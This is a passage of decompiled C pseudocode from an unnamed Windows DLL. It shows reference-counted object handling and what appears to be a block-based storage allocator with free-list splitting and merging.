  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (1002D111) --------------------------------------------------------
int __thiscall sub_1002D111(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (1002D125) --------------------------------------------------------
int __thiscall sub_1002D125(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (1002D12D) --------------------------------------------------------
_DWORD *__thiscall sub_1002D12D(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (1002D166) --------------------------------------------------------
_DWORD *__thiscall sub_1002D166(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (1002D19F) --------------------------------------------------------
_DWORD *__thiscall sub_1002D19F(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (1002D1D8) --------------------------------------------------------
_DWORD *__thiscall sub_1002D1D8(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (1002D225) --------------------------------------------------------
_DWORD *__userpurge sub_1002D225@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002D264) --------------------------------------------------------
void __thiscall sub_1002D264(void *this)
{
  sub_1002D55B((int)this);
}

//----- (1002D295) --------------------------------------------------------
_DWORD *__userpurge sub_1002D295@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002D2D4) --------------------------------------------------------
void __thiscall sub_1002D2D4(void *this)
{
  sub_1002D583((int)this);
}

//----- (1002D313) --------------------------------------------------------
_DWORD *__userpurge sub_1002D313@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002D352) --------------------------------------------------------
void __thiscall sub_1002D352(void *this)
{
  sub_1002D5BD((int)this);
}

//----- (1002D383) --------------------------------------------------------
_DWORD *__thiscall sub_1002D383(_DWORD *Block, char a2)
{
  sub_1002CA30(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002D3A2) --------------------------------------------------------
_DWORD *__thiscall sub_1002D3A2(_DWORD *this)
{
  return sub_10001611(this);
}

//----- (1002D3AC) --------------------------------------------------------
_DWORD *__thiscall sub_1002D3AC(_DWORD *Block, char a2)
{
  sub_1002CEE4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002D3CB) --------------------------------------------------------
_DWORD *__stdcall sub_1002D3CB(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10094BF4;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094BF4: using guessed type int (__thiscall *off_10094BF4)(void *Block, char);

//----- (1002D426) --------------------------------------------------------
_DWORD *__userpurge sub_1002D426@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  void *v5; // [esp-4h] [ebp-20h]

  sub_1002D5E5(a2);
  *a2 = &off_10094C68;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1002CCF0(a2, v2, v4, v5);
  return a2;
}
// 10094C68: using guessed type int (__thiscall *off_10094C68)(void *Block, char);

//----- (1002D474) --------------------------------------------------------
_DWORD *__stdcall sub_1002D474(_DWORD *a1)
{
  unsigned int v1; // eax

  sub_1002D5E5(a1);
  *a1 = &off_10094C68;
  v1 = sub_1002CCDD(1u, 0x10u);
  sub_1002D61A(a1, v1);
  return a1;
}
// 10094C68: using guessed type int (__thiscall *off_10094C68)(void *Block, char);

//----- (1002D4B3) --------------------------------------------------------
int __userpurge sub_1002D4B3@<eax>(_DWORD *a1@<edi>, int a2)
{
  int v2; // esi
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v7; // [esp+4h] [ebp-8h]
  int v8; // [esp+8h] [ebp-4h]

  v8 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v7 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v7 )
        break;
      v3 = (*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( !sub_1000D0B5(v3, a2) )
        break;
      v4 = (*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( sub_1000D097(v4, a2) )
      {
        v7 = v2;
        v5 = v2 + v8;
      }
      else
      {
        v8 = v2;
        v5 = v7 + v2 + 1;
      }
      v2 = v5 / 2;
    }
    while ( v5 / 2 > v8 );
  }
  if ( v2 == v8 )
    return v8 + 1;
  return v2;
}

//----- (1002D55B) --------------------------------------------------------
void __usercall sub_1002D55B(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002D583) --------------------------------------------------------
void __usercall sub_1002D583(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002D5BD) --------------------------------------------------------
void __usercall sub_1002D5BD(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002D5E5) --------------------------------------------------------
_DWORD *__stdcall sub_1002D5E5(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10094CC4;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094CC4: using guessed type int (__thiscall *off_10094CC4)(void *Block, char);

//----- (1002D61A) --------------------------------------------------------
void __usercall sub_1002D61A(_DWORD *a1@<edi>, unsigned int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 8u, a2, (void (__thiscall *)(void *))sub_1002D3A2, sub_10001651);
  }
  a1[3] = v2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1002D694) --------------------------------------------------------
_DWORD *__stdcall sub_1002D694(_DWORD *a1, int a2, int a3)
{
  sub_10016983(0, (int)(a1 + 1), 0);
  a1[7] = a3;
  sub_1002D72A(a2, a1);
  return a1;
}

//----- (1002D6D1) --------------------------------------------------------
_DWORD *__userpurge sub_1002D6D1@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3)
{
  int v3; // eax

  *a2 = a3;
  sub_10016AE9(a1, (int)(a2 + 1));
  v3 = a2[4];
  a2[7] = 0;
  a2[6] = v3;
  return a2;
}

//----- (1002D72A) --------------------------------------------------------
void __fastcall sub_1002D72A(int a1, _DWORD *a2)
{
  unsigned __int8 v4; // al
  void *v5; // eax
  int *v6; // eax
  int v7; // eax
  int *v8; // eax
  int v9; // esi
  _DWORD v10[7]; // [esp+10h] [ebp-68h] BYREF
  int v11[5]; // [esp+2Ch] [ebp-4Ch] BYREF
  int v12[4]; // [esp+40h] [ebp-38h] BYREF
  _DWORD pExceptionObject[5]; // [esp+60h] [ebp-18h] BYREF
  int v14; // [esp+74h] [ebp-4h]

  v14 = 0;
  (*(void (__thiscall **)(int, _DWORD, _DWORD))(*(_DWORD *)a1 + 8))(a1, a2[7], 0);
  sub_10035609(v10, a1);
  LOBYTE(v14) = 1;
  sub_1001C862(v12, (int)v10);
  LOBYTE(v14) = 2;
  v4 = sub_1001C8F5((int)v12);
  *a2 = v4;
  if ( v4 == 12 )
  {
    v5 = (void *)sub_1001C952(v12);
    v6 = (int *)sub_10016983(v5, (int)v11, 0);
    LOBYTE(v14) = 3;
    sub_10016B2F(v6, (int)(a2 + 1));
    LOBYTE(v14) = 2;
    sub_10016B53(v11);
    a2[6] = a2[4];
    v7 = sub_1001C952(v12);
    sub_10016E93(a2 + 1, 0, v7);
  }
  else
  {
    v8 = sub_1001CA63(v12, v11, 1);
    LOBYTE(v14) = 4;
    sub_10016B2F(v8, (int)(a2 + 1));
    LOBYTE(v14) = 2;
    sub_10016B53(v11);
    a2[6] = a2[4];
  }
  v9 = v10[6];
  if ( v9 != sub_1001C952(v12) )
  {
    sub_1002D863(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__);
  }
  if ( *a2 == 1 )
    *a2 = 12;
  LOBYTE(v14) = 1;
  sub_1001C8B3(v12);
  LOBYTE(v14) = 0;
  sub_10035662(v10);
}
// 1002D72A: using guessed type int var_38[4];
// 1002D72A: using guessed type int var_4C[5];
// 1002D72A: using guessed type _DWORD pExceptionObject[5];

//----- (1002D863) --------------------------------------------------------
_DWORD *__stdcall sub_1002D863(_DWORD *a1)
{
  *a1 = &unk_10094D84;
  sub_10016441(a1 + 1);
  sub_10018C8B(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10094D7C;
  return a1;
}
// 10094D7C: using guessed type int (__stdcall *off_10094D7C)(char);

//----- (1002D8B3) --------------------------------------------------------
void __thiscall sub_1002D8B3(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_1002D961((int)(this + 1));
  sub_1001646C(v1);
}

//----- (1002D8C5) --------------------------------------------------------
_DWORD *__thiscall sub_1002D8C5(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10094D84;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 1, v4);
  }
  sub_10018CF7(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10094D7C;
  return this;
}
// 10094D7C: using guessed type int (__stdcall *off_10094D7C)(char);

//----- (1002D934) --------------------------------------------------------
_DWORD *__thiscall sub_1002D934(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_1002D961((int)this);
  sub_1001646C(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1002D961) --------------------------------------------------------
int __stdcall sub_1002D961(int a1)
{
  return sub_10018D93(a1);
}

//----- (1002D981) --------------------------------------------------------
int __usercall sub_1002D981@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  char v2; // al
  int v4[9]; // [esp-14h] [ebp-64h] BYREF
  _DWORD v5[6]; // [esp+10h] [ebp-40h] BYREF
  int v6; // [esp+28h] [ebp-28h]
  _DWORD v7[8]; // [esp+2Ch] [ebp-24h] BYREF
  int v8; // [esp+4Ch] [ebp-4h]

  (*(void (__thiscall **)(int, _DWORD, _DWORD))(*(_DWORD *)a1 + 8))(a1, a2[7], 0);
  a2[6] = a2[4];
  sub_1003551D(v5, a1);
  v8 = 0;
  sub_1001CC48(v7, (int)v5, 1);
  LOBYTE(v8) = 1;
  sub_1001CCDC(v7, *(unsigned __int8 *)a2);
  if ( *a2 == 12 )
  {
    sub_1001CD27(v7, a2[4]);
    v2 = sub_10016E72(a2 + 1, 0);
    sub_1001CD27(v7, v2);
  }
  else
  {
    v7[4] = v4;
    sub_10016AE9(a2 + 1, (int)v4);
    LOBYTE(v8) = 1;
    sub_1001CDCD(v7, v4[0], v4[1], v4[2], v4[3], v4[4]);
  }
  sub_1001CD27(v7, v6);
  LOBYTE(v8) = 0;
  sub_1001CC9A(v7);
  v8 = -1;
  return sub_10035576(v5);
}
// 1002D981: using guessed type _DWORD var_40[6];

//----- (1002DA3A) --------------------------------------------------------
int __thiscall sub_1002DA3A(void *this, int a2)
{
  _DWORD *v2; // edi
  int v3; // eax
  bool v4; // zf
  int v6[5]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD pExceptionObject[5]; // [esp+24h] [ebp-18h] BYREF
  int v8; // [esp+38h] [ebp-4h]

  *(_DWORD *)a2 = this;
  sub_1002E062((int)this, (_DWORD *)(a2 + 16), 0);
  v8 = 0;
  v2 = *(_DWORD **)(a2 + 16);
  if ( *v2
    || (sub_10016AE9(v2 + 1, (int)v6), LOBYTE(v8) = 1, v6[3] != 10)
    || (*(_DWORD *)(a2 + 8) = sub_10016E72(v6, 2),
        *(_WORD *)(a2 + 4) = sub_10016EC6(v6),
        v3 = sub_10016E72(v6, 6),
        v4 = *(_WORD *)(a2 + 4) == 257,
        *(_DWORD *)(a2 + 12) = v3,
        !v4) )
  {
    sub_1002D863(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__);
  }
  LOBYTE(v8) = 0;
  sub_10016B53(v6);
  return a2;
}
// 1002DA3A: using guessed type _DWORD pExceptionObject[5];

//----- (1002DAD5) --------------------------------------------------------
int __stdcall sub_1002DAD5(int a1, int a2, int a3, int a4)
{
  _DWORD *v4; // eax
  int v6[4]; // [esp-14h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-3Ch]
  int v8[5]; // [esp+10h] [ebp-28h] BYREF
  void *v9[4]; // [esp+24h] [ebp-14h] BYREF
  int v10; // [esp+34h] [ebp-4h]

  *(_DWORD *)a1 = a2;
  *(_DWORD *)(a1 + 8) = a3;
  v7 = 0;
  *(_WORD *)(a1 + 4) = 257;
  *(_DWORD *)(a1 + 12) = a4;
  sub_10019B8C((_DWORD *)(a1 + 16), v7);
  v10 = 0;
  sub_10016983((void *)0xA, (int)v8, 0);
  LOBYTE(v10) = 1;
  sub_10016F14(v8);
  sub_10016EE4(v8, *(_WORD *)(a1 + 4));
  sub_10016E93(v8, 2, *(_DWORD *)(a1 + 8));
  sub_10016E93(v8, 6, *(_DWORD *)(a1 + 12));
  sub_10016AE9(v8, (int)v6);
  LOBYTE(v10) = 1;
  v4 = sub_1002DFC8(a2, v9, 0, 0, v6[0], v6[1], v6[2], v6[3], v7);
  LOBYTE(v10) = 3;
  sub_10019BF9(v4, a1 + 16);
  LOBYTE(v10) = 1;
  sub_10019BCB(v9);
  LOBYTE(v10) = 0;
  sub_10016B53(v8);
  return a1;
}
// 1002DAD5: using guessed type int var_28[5];

//----- (1002DBA8) --------------------------------------------------------
LONG __userpurge sub_1002DBA8@<eax>(int *a1@<edi>, int a2)
{
  int v3; // [esp-Ch] [ebp-40h]
  _DWORD *v4; // [esp-8h] [ebp-3Ch]
  volatile LONG *v5; // [esp-4h] [ebp-38h]
  int v6[7]; // [esp+14h] [ebp-20h] BYREF
  int v7; // [esp+30h] [ebp-4h]

  a1[2] = a2;
  sub_10016AE9((_DWORD *)(a1[4] + 4), (int)v6);
  v7 = 0;
  sub_10016E93(v6, 2, a1[2]);
  sub_10016B2F(v6, a1[4] + 4);
  v5 = (volatile LONG *)a1[5];
  v4 = (_DWORD *)a1[4];
  InterlockedIncrement(v5);
  LOBYTE(v7) = 1;
  v3 = *a1;
  LOBYTE(v7) = 0;
  sub_1002E51A(v3, v4, (int)v5);
  v7 = -1;
  return sub_10016B53(v6);
}
// 1002DBA8: using guessed type int var_20[7];

//----- (1002DC25) --------------------------------------------------------
_DWORD *__thiscall sub_1002DC25(void *this, _DWORD *a2, unsigned int a3)
{
  *a2 = this;
  sub_1002E062((int)this, a2 + 2, a3);
  a2[1] = sub_10016E72((_DWORD *)(a2[2] + 4), 0);
  return a2;
}

//----- (1002DC63) --------------------------------------------------------
int *__stdcall sub_1002DC63(int *a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // eax
  int v7[4]; // [esp-14h] [ebp-50h] BYREF
  int v8; // [esp-4h] [ebp-40h]
  int v9[5]; // [esp+10h] [ebp-2Ch] BYREF
  void *v10[5]; // [esp+24h] [ebp-18h] BYREF
  int v11; // [esp+38h] [ebp-4h]

  *a1 = a2;
  v8 = 0;
  a1[1] = a5;
  sub_10019B8C(a1 + 2, v8);
  v11 = 0;
  sub_10016983((void *)(a4 - 9), (int)v9, 0);
  LOBYTE(v11) = 1;
  sub_10016F14(v9);
  sub_10016E93(v9, 0, a1[1]);
  sub_10016AE9(v9, (int)v7);
  LOBYTE(v11) = 1;
  v5 = sub_1002DFC8(a2, v10, 12, a3, v7[0], v7[1], v7[2], v7[3], v8);
  LOBYTE(v11) = 3;
  sub_10019BF9(v5, (int)(a1 + 2));
  LOBYTE(v11) = 1;
  sub_10019BCB(v10);
  LOBYTE(v11) = 0;
  sub_10016B53(v9);
  return a1;
}
// 1002DC63: using guessed type int var_2C[5];

//----- (1002DD20) --------------------------------------------------------
int __stdcall sub_1002DD20(int a1, int a2)
{
  _DWORD *v2; // edi
  int v3; // eax
  _DWORD v5[2]; // [esp+10h] [ebp-20h] BYREF
  int v6[5]; // [esp+18h] [ebp-18h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  *(_DWORD *)a1 = &off_10093D34;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  v7 = 0;
  *(_DWORD *)(a1 + 12) = a2;
  *(_DWORD *)a1 = &off_10094D9C;
  v2 = sub_1001445F(v5);
  LOBYTE(v7) = 1;
  v3 = (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 12) + 36))(*(_DWORD *)(a1 + 12), v6);
  LOBYTE(v7) = 2;
  sub_100174BF(a1 + 16, 17, v3, 1, *(struct _SECURITY_ATTRIBUTES **)(*v2 + 4));
  LOBYTE(v7) = 4;
  sub_1000CE59(v6);
  LOBYTE(v7) = 5;
  sub_100015D8(v5);
  sub_1000CC20((_DWORD *)(a1 + 32), word_100B6F0C);
  *(_DWORD *)(a1 + 40) = 0;
  return a1;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10094D9C: using guessed type int (__thiscall *off_10094D9C)(void *Block, char);
// 100B6F0C: using guessed type wchar_t word_100B6F0C[8];
// 1002DD20: using guessed type _DWORD var_20[2];
// 1002DD20: using guessed type int var_18[5];

//----- (1002DDBD) --------------------------------------------------------
int *__thiscall sub_1002DDBD(int *Block, char a2)
{
  sub_1002DDDC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002DDDC) --------------------------------------------------------
BOOL __thiscall sub_1002DDDC(int *this)
{
  BOOL result; // eax
  _DWORD v3[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v4; // [esp+28h] [ebp-4h]

  v3[2] = this;
  *this = (int)&off_10094D9C;
  v4 = 3;
  sub_100171BE(this + 4, v3);
  LOBYTE(v4) = 4;
  (*(void (__thiscall **)(int))(*(_DWORD *)this[3] + 8))(this[3]);
  LOBYTE(v4) = 3;
  sub_100171F2(v3);
  v4 = 1;
  sub_1000CE59(this + 8);
  LOBYTE(v4) = 0;
  result = sub_100175EC((HANDLE *)this + 4);
  *this = (int)&off_10093D34;
  return result;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10094D9C: using guessed type int (__thiscall *off_10094D9C)(void *Block, char);

//----- (1002DE5C) --------------------------------------------------------
void __thiscall sub_1002DE5C(void *this)
{
  char v1[28]; // [esp+4h] [ebp-28h] BYREF
  int v2; // [esp+28h] [ebp-4h]

  sub_1002DA3A(this, (int)v1);
  v2 = -1;
  sub_1002DEAE((int)v1);
}

//----- (1002DEAE) --------------------------------------------------------
void __stdcall sub_1002DEAE(int a1)
{
  sub_10019BCB((void **)(a1 + 16));
}

//----- (1002DED2) --------------------------------------------------------
int __userpurge sub_1002DED2@<eax>(unsigned int a1@<ecx>, int a2@<ebx>, unsigned int a3)
{
  int v4; // edi
  unsigned int v5; // esi
  bool v6; // zf
  int v7; // eax
  char v9[24]; // [esp+10h] [ebp-3Ch] BYREF
  _DWORD v10[2]; // [esp+28h] [ebp-24h] BYREF
  int v11[2]; // [esp+30h] [ebp-1Ch] BYREF
  _DWORD pExceptionObject[4]; // [esp+38h] [ebp-14h] BYREF
  int v13; // [esp+48h] [ebp-4h]

  sub_100171BE((int *)a2, v10);
  v13 = 0;
  v4 = 26;
  if ( a1 < 0x1A )
  {
    sub_10018C8B(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__);
  }
  v5 = a1 - a1 % 0xD;
  if ( v5 > a3 )
  {
    sub_10016441(&a3);
    _CxxThrowException(&a3, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a2 + 12) + 24))(*(_DWORD *)(a2 + 12)) == 0;
  v7 = **(_DWORD **)(a2 + 12);
  if ( v6 )
    (*(void (__cdecl **)(unsigned int))(v7 + 28))(v5);
  else
    (*(void (__cdecl **)(unsigned int))(v7 + 20))(v5);
  if ( v5 <= 0x1A )
    v4 = 0;
  sub_1002DAD5((int)v9, a2, v4, a3);
  LOBYTE(v13) = 1;
  if ( v4 )
  {
    sub_1002DC63(v11, a2, v4, v5 - v4, 0);
    LOBYTE(v13) = 1;
    sub_1002DFA4((int)v11);
  }
  LOBYTE(v13) = 0;
  sub_1002DEAE((int)v9);
  v13 = -1;
  return sub_100171F2(v10);
}
// 1002DED2: using guessed type _DWORD var_24[2];
// 1002DED2: using guessed type _DWORD pExceptionObject[4];

//----- (1002DFA4) --------------------------------------------------------
void __stdcall sub_1002DFA4(int a1)
{
  sub_10019BCB((void **)(a1 + 8));
}

//----- (1002DFC8) --------------------------------------------------------
_DWORD *__stdcall sub_1002DFC8(int a1, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v12; // [esp-8h] [ebp-2Ch]
  volatile LONG *v13; // [esp-4h] [ebp-28h]

  v9 = operator new(0x20u);
  if ( v9 )
    v10 = sub_1002D6D1(&a5, v9, a3);
  else
    v10 = 0;
  sub_10019B8C(a2, (int)v10);
  *(_DWORD *)(*a2 + 28) = a4;
  v13 = (volatile LONG *)a2[1];
  v12 = (_DWORD *)*a2;
  InterlockedIncrement(v13);
  sub_1002E51A(a1, v12, (int)v13);
  sub_10016B53(&a5);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002E062) --------------------------------------------------------
_DWORD *__thiscall sub_1002E062(int this, _DWORD *a2, unsigned int a3)
{
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD v7[2]; // [esp+10h] [ebp-20h] BYREF
  int v8; // [esp+18h] [ebp-18h]
  int pExceptionObject; // [esp+1Ch] [ebp-14h] BYREF
  void *Block; // [esp+20h] [ebp-10h]
  int v11; // [esp+2Ch] [ebp-4h]

  v11 = 0;
  v8 = 0;
  sub_100171BE((int *)this, v7);
  v11 = 1;
  if ( a3 >= (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 16))(*(_DWORD *)(this + 12)) )
  {
    sub_1002D863(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__);
  }
  Block = operator new(0x20u);
  LOBYTE(v11) = 2;
  if ( Block )
  {
    v4 = (***(int (__thiscall ****)(_DWORD))(this + 12))(*(_DWORD *)(this + 12));
    v5 = sub_1002D694(Block, v4, a3);
  }
  else
  {
    v5 = 0;
  }
  LOBYTE(v11) = 1;
  sub_10019B8C(a2, (int)v5);
  v8 = 1;
  LOBYTE(v11) = 0;
  sub_100171F2(v7);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1002E062: using guessed type _DWORD var_20[2];

//----- (1002E117) --------------------------------------------------------
void __userpurge sub_1002E117(int a1@<ecx>, int a2@<ebx>, int a3@<esi>, int a4, int a5, int a6, int *a7)
{
  int v7; // edi
  int v8[4]; // [esp+10h] [ebp-30h] BYREF
  int v9[7]; // [esp+20h] [ebp-20h] BYREF
  int v10; // [esp+3Ch] [ebp-4h]

  v7 = a1;
  if ( a3 + a2 == a1 )
  {
    a5 += a2;
    v7 = a3;
  }
  sub_1002DC63(v8, a4, v7, a5, a6);
  v10 = 0;
  if ( a3 )
  {
    if ( v7 != a3 )
    {
      sub_1002DC63(v9, a4, a3, a2, v7);
      LOBYTE(v10) = 0;
      sub_1002DFA4((int)v9);
    }
  }
  else
  {
    sub_1002DBA8(a7, v7);
  }
  v10 = -1;
  sub_1002DFA4((int)v8);
}
// 1002E117: using guessed type int var_30[4];
// 1002E117: using guessed type int var_20[7];

//----- (1002E18C) --------------------------------------------------------
void __fastcall sub_1002E18C(int a1, unsigned int a2, void *a3)
{
  unsigned int v5; // edi
  int v6; // [esp+14h] [ebp-40h]
  int v7; // [esp+18h] [ebp-3Ch]
  int v8; // [esp+1Ch] [ebp-38h] BYREF
  unsigned int v9; // [esp+20h] [ebp-34h]
  int v10; // [esp+24h] [ebp-30h]
  int v11[2]; // [esp+2Ch] [ebp-28h] BYREF
  unsigned int v12; // [esp+34h] [ebp-20h]
  int v13; // [esp+50h] [ebp-4h]

  sub_1002DA3A(a3, (int)v11);
  v13 = 0;
  v5 = v12;
  v7 = 0;
  v6 = 0;
  if ( v12 )
  {
    while ( 1 )
    {
      sub_1002DC25(a3, &v8, v5);
      LOBYTE(v13) = 1;
      if ( a2 < v5 )
        break;
      v7 = v5;
      v5 = v9;
      v6 = *(_DWORD *)(v10 + 24) + 9;
      LOBYTE(v13) = 0;
      sub_1002DFA4((int)&v8);
      if ( !v5 )
        goto LABEL_4;
    }
    if ( v5 == a2 + a1 )
    {
      v5 = v9;
      a1 += *(_DWORD *)(v10 + 24) + 9;
    }
    sub_1002E117(a2, v6, v7, (int)a3, a1, v5, v11);
    LOBYTE(v13) = 0;
    sub_1002DFA4((int)&v8);
  }
  else
  {
LABEL_4:
    sub_1002E117(a2, v6, v7, (int)a3, a1, v5, v11);
  }
  v13 = -1;
  sub_1002DEAE((int)v11);
}

//----- (1002E293) --------------------------------------------------------
unsigned int __fastcall sub_1002E293(unsigned int a1, _DWORD **a2)
{
  unsigned int v4; // ebx
  unsigned int v5; // eax
  int v6; // esi
  int v8; // [esp-8h] [ebp-74h]
  int v9; // [esp+14h] [ebp-58h]
  int v10; // [esp+18h] [ebp-54h]
  int pExceptionObject[2]; // [esp+1Ch] [ebp-50h] BYREF
  int v12; // [esp+24h] [ebp-48h] BYREF
  unsigned int v13; // [esp+28h] [ebp-44h]
  int v14; // [esp+2Ch] [ebp-40h]
  int v15[4]; // [esp+34h] [ebp-38h] BYREF
  int v16[2]; // [esp+44h] [ebp-28h] BYREF
  unsigned int v17; // [esp+4Ch] [ebp-20h]
  unsigned int v18; // [esp+50h] [ebp-1Ch]
  int v19; // [esp+68h] [ebp-4h]

  sub_1002DA3A(a2, (int)v16);
  v19 = 0;
  v4 = v17;
  v10 = 0;
  pExceptionObject[0] = 0;
  if ( v17 )
  {
    while ( 1 )
    {
      sub_1002DC25(a2, &v12, v4);
      LOBYTE(v19) = 1;
      v5 = *(_DWORD *)(v14 + 24) + 9;
      v9 = v13;
      if ( v5 >= a1 )
        break;
      v10 = v4;
      pExceptionObject[0] = *(_DWORD *)(v14 + 24) + 9;
      v4 = v13;
